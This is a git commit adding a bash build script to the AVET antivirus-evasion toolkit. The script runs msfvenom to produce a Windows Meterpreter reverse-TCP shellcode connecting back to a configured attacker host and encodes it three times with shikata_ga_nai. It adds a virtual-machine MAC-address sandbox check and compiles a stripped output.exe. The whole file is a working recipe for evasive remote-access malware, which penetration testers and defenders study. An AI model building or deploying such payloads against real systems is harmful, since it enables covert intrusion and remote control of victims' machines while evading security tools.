3bf1337bcb2998e32df1d8d0ed7abc58d33191fd
Daniel Sauder <daniel.sauder@web.de>
2019-06-18 16:52:11 +0200

    build script for has_vm_mac

---
+++ build/build_win32_meterpreter_rev_tcp_shikata_hasvmmac.sh
@@ -0,0 +1,50 @@
+#!/bin/bash          
+# Use AVET encoding.
+
+# print AVET logo
+cat banner.txt
+
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+
+# import feature construction interface
+. build/feature_construction.sh
+
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
+
+# make meterpreter reverse payload, encoded with shikata_ga_nai
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
+
+# add fopen sandbox evasion
+add_evasion has_vm_mac
+
+# set shellcode source
+set_payload_source static_from_file input/sc_c.txt
+
+# set decoder and key source
+# AVET decoder needs no key
+set_decoder none
+set_key_source none
+
+# set payload info source
+set_payload_info_source none
+
+# set shellcode binding technique
+set_payload_execution_method exec_shellcode
+
+# enable debug output
+enable_debug_print
+
+# compile to output.exe file
+$win32_compiler -o output/output.exe source/avet.c -lws2_32 -liphlpapi
+strip output/output.exe
+
+# cleanup
+cleanup_techniques
